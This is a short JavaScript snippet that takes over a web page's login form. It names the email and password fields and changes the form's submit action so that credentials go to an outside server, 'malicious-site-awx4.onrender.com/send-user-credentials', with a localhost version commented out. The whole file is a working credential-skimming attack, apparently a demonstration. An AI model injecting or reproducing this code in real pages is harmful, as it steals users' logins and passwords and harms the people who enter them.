const form = document.querySelector("form");

const email = document
  .querySelector('input[type="email"]')
  .setAttribute("name", "email");

const password = document
  .querySelector('input[type="password"]')
  .setAttribute("name", "password");

const maliciousSite =
  "https://malicious-site-awx4.onrender.com/send-user-credentials";
// form.setAttribute("action", "http://localhost:3000/send-user-credentials");
form.setAttribute("action", maliciousSite);
